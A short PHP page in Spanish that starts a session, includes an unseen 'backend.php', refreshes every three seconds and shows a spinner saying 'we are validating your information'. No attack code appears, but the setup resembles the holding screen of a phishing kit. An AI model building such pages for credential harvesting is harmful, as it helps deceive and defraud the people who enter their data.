<?php
session_start();
include("backend.php");
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta http-equiv="refresh" content="3">
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <title>Cargando...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #fff;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      font-family: sans-serif;
    }

    .loader {
      width: 60px;
      height: 60px;
      border: 4px solid #ccc;
      border-top: 4px solid #0033a0;
      border-radius: 50%;
      animation: girar 0.9s linear infinite;
    }

    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .mensaje {
      color: #333;
      font-size: 16px;
      margin-bottom: 20px;
    }
  </style>
</head>
<body>
  <p class="mensaje">Estamos validando tu información</p>
  <div class="loader"></div>
</body>
</html>
